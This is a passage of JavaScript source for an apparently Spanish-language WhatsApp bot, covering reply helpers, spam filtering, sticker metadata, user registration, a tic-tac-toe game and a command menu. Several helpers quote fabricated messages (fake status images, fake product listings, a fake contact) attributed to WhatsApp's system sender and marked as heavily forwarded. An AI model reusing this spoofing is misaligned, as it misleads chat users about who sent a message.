		       } catch (err) { console.error(err)  }
 	       }

const fakethumb = (teks, yes) => {
            cnf.sendMessage(from, teks, image, {thumbnail:fs.readFileSync('./sticker/fake.jpeg'),quoted:mek,caption:yes})
        }
        const fakestatus = (teks) => {
            cnf.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": `Hola ${pushname}`,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./sticker/thumb.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    },
                    contextInfo: {
                      "forwardingScore": 999, "isForwarded": true
                    }
                }
            })
        }
        const faketokoforwaded = (teks) => {
	anu = {
	  key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": fs.readFileSync(`./sticker/thumb.jpeg`)
					},
					"title": `Hola ${pushname}, ${ucapanWaktu}`,
					"retailerId": "Confu bot",
					"productImageCount": 1
				},
				"businessOwnerJid": `0@s.whatsapp.net`
		}
	}
}
	cnf.sendMessage(from, teks, text, {
	  quoted: anu,
	  contextInfo:{
	    "forwardingScore": 999, "isForwarded": true
	  }
	})
}

	const fspam = {
		key: {
		fromMe: false,
		participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
		},
		message: {
		"contactMessage": {
		"displayName": `${pushname} NO SPAM!!`,
		"vcard": 'BEGIN:VCARD\n' +
    		'Version:3.0\n' +
    		'TEL;type=CELL;type=VOICE;waid=51931655706:+51931655706\n' +
		'item1.X-ABLabel:Celular' +
    		'END:VCARD'
		}
		}
		}

        const fakegroup = (teks) => {
            cnf.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": `Hola ${pushname}`,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./sticker/thumb.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }


const fdocu = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "documentMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "title": fake, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('media/cnf.jpeg')}}}
            


const freply = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": fake, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync(`media/cnf.jpeg`)} } }


const ftoko = {
key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": fs.readFileSync(`./media/cnf.jpeg`)
					},
					"title": fake,
					"description": "🌸Watame-BOT🌸",
					"currencyCode": "USD",
					"priceAmount1000": "1000000000",
					"retailerId": "Confu",
					"productImageCount": 1
				},
				"businessOwnerJid": `0@s.whatsapp.net`
		}
	}
}
const uploadImages = (buffData, type) => {
    
    return new Promise(async (resolve, reject) => {
        const { ext } = await fromBuffer(buffData)
        const cmd = text.toLowerCase()
        const filePath = 'utils/tmp.' + ext
        const _buffData = type ? await resizeImage(buffData, false) : buffData
        fs.writeFile(filePath, _buffData, { encoding: 'base64' }, (err) => {
            if (err) return reject(err)
            console.log('Uploading image to telegra.ph server...')
            const fileData = fs.readFileSync(filePath)
            const form = new FormData()
            form.append('file', fileData, 'tmp.' + ext)
            fetch('https://telegra.ph/upload', {
                method: 'POST',
                body: form
            })
                .then(res => res.json())
                .then(res => {
                    if (res.error) return reject(res.error)
                    resolve('https://telegra.ph' + res[0].src)
                })
                .then(() => fs.unlinkSync(filePath))
                .catch(err => reject(err))
        })
    })
}

        const isImage = type == 'imageMessage'
        const isVideo = type == 'videoMessage'
        const isAudio = type == 'audioMessage'
        const isSticker = type == 'stickerMessage'
        const isContact = type == 'contactMessage'
        const isLocation = type == 'locationMessage'
        
	const isTexto = type == 'textMessage'
        
        typeMessage = body.substr(0, 50).replace(/\n/g, '')
        if (isImage) typeMessage = "Image"
        else if (isVideo) typeMessage = "Video"
        else if (isAudio) typeMessage = "Audio"
        else if (isSticker) typeMessage = "Sticker"
        else if (isContact) typeMessage = "Contact"
        else if (isLocation) typeMessage = "Location"
	else if (isTexto) typeMessage = "text"

			colors = ['red','white','black','blue','yellow','green']
			const isMedia = (type === 'imageMessage' || type === 'videoMessage')
			const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
			const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
			const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
			const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage') 



   if (itsMe){
     if(chats.toLowerCase() == `${prefix}self`){
       public = false
       cnf.sendMessage(from, `Success`, `ESTADO : UNO MISMO`)
     }
     if (chats.toLowerCase() == 'status'){
       cnf.sendMessage(from, `STATUS : ${public ? 'PUBLICO' : 'UNO MISMO'}`)
     }
   }
   
  if (!public){
    if (!mek.key.fromMe) return
  }
  

		if (!isGroup && isCmd) console.log(chalk.greenBright("├"), chalk.keyword("aqua")("[ COMMANDO ]"), chalk.whiteBright(typeMessage), chalk.greenBright("de"), chalk.keyword("yellow")(pushname))
        	if (isGroup && isCmd) console.log(chalk.greenBright("├"), chalk.keyword("aqua")("[ COMMANDO ]"), chalk.whiteBright(typeMessage), chalk.greenBright("de"), chalk.keyword("yellow")(pushname), chalk.greenBright("en el grupo"), chalk.keyword("yellow")(groupName))
	
	    	if (isBanned && isCmd && !isOwner) {
		reply('*¡Has tenido demasiadas interacciones por hoy!*')
        	return console.log(chalk.greenBright("├"), chalk.keyword("magenta")("[ USUARIO BANEADO ]"), chalk.whiteBright(`${command}`), chalk.greenBright("de"), chalk.keyword("yellow")(pushname))
        	}
	
		if (isCmd && isFiltered(from) && !isGroup) {
        	console.log(chalk.greenBright("├"), chalk.keyword("red")("[ SPAM ]"), chalk.whiteBright(`${command}`), chalk.greenBright("de"), chalk.keyword("yellow")(senderNumber))
        	return cnf.sendMessage(from, `🙂 Porfavor ${pushname}...\n\nMas lento, espera 3 segundos para poder usar otros comandos.`, MessageType.text, {quoted: fspam})
		}
        
        	if (isCmd && isFiltered(from) && isGroup) {
        	console.log(chalk.greenBright("├"), chalk.keyword("red")("[ SPAM ]"), chalk.whiteBright(`${command}`), chalk.greenBright("de"), chalk.keyword("yellow")(senderNumber))
        	return cnf.sendMessage(from, `Por favor ${pushname}, espera 10 segundos para poder usar otros comandos, gracias.`, MessageType.text, {quoted: fspam})
		}
	   
	   
			function addMetadata(packname, author) {	
				if (!packname) packname = 'WABot'; if (!author) author = 'Bot';	
				author = author.replace(/[^a-zA-Z0-9]/g, '');	
				let name = `${author}_${packname}`
				if (fs.existsSync(`./src/stickers/${name}.exif`)) return `./src/stickers/${name}.exif`
				const json = {	
					"sticker-pack-name": packname,
					"sticker-pack-publisher": author,
				}
				const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])	
				const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]	

				let len = JSON.stringify(json).length	
				let last	

				if (len > 256) {	
					len = len - 256	
					bytes.unshift(0x01)	
				} else {	
					bytes.unshift(0x00)	
				}	

				if (len < 16) {	
					last = len.toString(16)	
					last = "0" + len	
				} else {	
					last = len.toString(16)	
				}	

				const buf2 = Buffer.from(last, "hex")	
				const buf3 = Buffer.from(bytes)	
				const buf4 = Buffer.from(JSON.stringify(json))	
               
				const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])	

				fs.writeFile(`./src/stickers/${name}.exif`, buffer, (err) => {	
					return `./src/stickers/${name}.exif`	
				})	

			}
			
			
			
			switch(command) {
			
							case prefix+'registrar':
							if (isBanned) return  reply(mess.banned)
                if (isRegistered) return  reply(ind.rediregis())
                if (!q.includes('|')) return  reply(ind.wrongf())
                const namaUser = q.substring(0, q.indexOf('|') - 0)
                const umurUser = q.substring(q.lastIndexOf('|') + 1)
                const serialUser = createSerial(20)
                if(isNaN(umurUser)) return await reply('La edad debe ser un número!!')
                if (namaUser.length >= 30) return reply(`¿Por qué tu nombre es tan largo?`)
                if (umurUser > 40) return reply(`Tu edad es demasiado mayor, máximo 40 años`)
                if (umurUser < 12) return reply(`Eres demasiado joven, mínimo 12 años`)
                try {
					ppimg = await cnf.getProfilePicture(`${sender.split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
					daftarimg = await getBuffer(ppimg)
                veri = sender
                if (isGroup) {
                    addRegisteredUser(sender, namaUser, umurUser, time, serialUser)
                    await cnf.sendMessage(from, daftarimg, image, {quoted: mek, caption: ind.registered(namaUser, umurUser, serialUser, time, sender)})
                    addATM(sender)
                    addLevelingId(sender)
                    console.log(color('[REGISTER]'), color(time, 'yellow'), 'Name:', color(namaUser, 'cyan'), 'Age:', color(umurUser, 'cyan'), 'Serial:', color(serialUser, 'cyan'), 'in', color(sender || groupName))
                } else {
                    addRegisteredUser(sender, namaUser, umurUser, time, serialUser)
                    await cnf.sendMessage(from, daftarimg, image, {quoted: mek, caption: ind.registered(namaUser, umurUser, serialUser, time, sender)})
                    addATM(sender)
                    addLevelingId(sender)
                    console.log(color('[REGISTER]'), color(time, 'yellow'), 'Name:', color(namaUser, 'cyan'), 'Age:', color(umurUser, 'cyan'), 'Serial:', color(serialUser, 'cyan'))
                }
				addFilter(from)
          break

			  
case prefix+'tictactoe':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isGroup) return reply(mess.only.group)

if (args.length < 1) return reply('Etiqueta a tu oponente ⚔️')
if (isTTT) return reply('Hay un juego en este grupo, espere')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Etiqueta al objetivo del oponente')
ment = mek.message.extendedTextMessage.contextInfo.mentionedJid
player1 = sender
player2 = ment[0]
angka = ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
gilir = player2
id = from
ky_ttt.push({player1,player2,id,angka,gilir})
cnf.sendMessage(from, `*🎳 Iniciar un juego de Tictactoe 🎲*

[@${player2.split('@')[0]}] Te desafían a convertirte en un oponente del juego🔥
Escribe Y/N para aceptar o rechazar el juego.

Escriba ${prefix}delttt, para reiniciar los juegos grupales.`, text, {contextInfo: {mentionedJid: [player2]}})
addFilter(from)
          break
                                                                                
                case prefix+'delltictactoe':
                case prefix+'delttt':
     if (isBanned) return  reply(mess.banned)           
if (!isGroup) return reply(mess.only.group)
if (!isTTT) return reply('No hay juegos en este grupo')
naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
ky_ttt = naa 
reply('Listo UwU')
addFilter(from)
          break			

			     case prefix+'menu':
		if (isBanned) return  reply(mess.banned)	       
if (!isRegistered) return reply(ind.noregis())		
                    wew = fs.readFileSync(`./media/cnf.jpeg`)
const sosGay = checkATMuser(sender)   
                                     lzain = ` ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*╭✦┅╡ MENU PRINCIPAL ╞┅✦╮*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*╟ ❒ ${prefix}tts*
*╟ ❒ ${prefix}attp*
*╟ ❒ ${prefix}sticker*
*╟ ❒ ${prefix}idiomas (tts)*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*┠━➣NUEVOS*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*╟ ❒ ${prefix}ban*
*╟ ❒ ${prefix}coinflip*
*╟ ❒ ${prefix}memes*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*┠━➣MULTIMEDIA*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*╟ ❒ ${prefix}toimg*
*╟ ❒ ${prefix}tomp3*
*╟ ❒ ${prefix}wpanime*
*╟ ❒ ${prefix}wallpaper*
*╟ ❒ ${prefix}play (audio)*
*╟ ❒ ${prefix}play2 (video)*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*┠━➣NIVEL Y DINERO*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*╟ ❒ ${prefix}yo*
*╟ ❒ ${prefix}cartera*
*╟ ❒ ${prefix}trabajar*
*╟ ❒ ${prefix}transferir @ | cantidad*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*┠━➣OTAKU*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*╟ ❒ ${prefix}loli*
*╟ ❒ ${prefix}loli2*
*╟ ❒ ${prefix}yaoi*
*╟ ❒ ${prefix}poke*
*╟ ❒ ${prefix}waifu*
*╟ ❒ ${prefix}hinata*
*╟ ❒ ${prefix}avatar*
*╟ ❒ ${prefix}kanna*
*╟ ❒ ${prefix}anime*
*╟ ❒ ${prefix}sakura*
*╟ ❒ ${prefix}naruto*
*╟ ❒ ${prefix}waifu2*
*╟X* ‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎ ‏‏‎‎
*┠━➣REACCIONES*
